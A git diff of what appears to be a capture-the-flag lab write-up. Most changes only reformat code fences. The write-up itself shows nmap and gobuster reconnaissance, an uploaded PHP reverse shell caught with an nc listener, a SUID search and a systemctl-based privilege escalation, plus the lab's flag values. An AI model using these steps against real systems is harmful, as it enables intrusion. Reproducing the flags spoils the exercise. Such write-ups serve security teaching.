@@ -3,7 +3,7 @@
 # Task 1 ⇒ Deploy the machine
 IP: ```10.10.255.221```
 # Task 2⇒ Reconnaissance
-```
+```bash
 ┌─[root@parrot]─[/home/alexdos2010m]
 └──╼ #nmap -sV -sC 10.10.255.221
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-14 11:11 IST
@@ -65,7 +65,7 @@ What is the most likely operating system this machine is running? `Ubuntu`
 
 What port is the web server running on? `3333`
 # Task 3⇒ Locating directories using GoBuster!!
-```
+```bash
 ┌─[alexdos2010m@parrot]─[~]
 └──╼ $gobuster dir -u http://10.10.255.221:3333 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt 
 ===============================================================
@@ -92,6 +92,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 2021/08/14 11:58:22 Finished
 ===============================================================
 ```
+
 <!-- ![[form_internal.png]] -->
 <img src = 'assets/img/form_internal.png'>
 # Task 4⇒ Compromise the webserver
@@ -104,7 +105,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 <!-- ![[form_internal_phtml.png]] -->
 [reverse PHP](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
 
-```
+```bash
 ┌─[alexdos2010m@parrot]─[~/Downloads]
 └──╼ $nc -lvnp 1234
 listening on [any] 1234 ...
@@ -144,7 +145,7 @@ vmlinuz
 <img src = 'assets/img/task4.png'>
 <!-- ![[task4.png]] -->
 
-```
+```bash
 $ cd home
 $ ls
 bill
@@ -153,10 +154,12 @@ $ ls
 user.txt
 ```
 
-`$ cat user.txt 
-8bd7992fbe8a6ad22a63361004cfcedb`
-# Task 5⇒ Privilege Escalation
+```bash
+$ cat user.txt 
+8bd7992fbe8a6ad22a63361004cfcedb
 ```
+# Task 5⇒ Privilege Escalation
+```bash
 $ find / -perm -u=s -type f 2>/dev/null
 /usr/bin/newuidmap
 /usr/bin/chfn
@@ -195,7 +198,7 @@ $ /bin/systemctl enable --now $TF
 Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.hNU5Ie7Gaj.service to /tmp/tmp.hNU5Ie7Gaj.service.
 ```
 
-`
+```bash
 $ cat /tmp/output
 a58ff8579f0a9270368d33a9966c7fd5
-`
+```
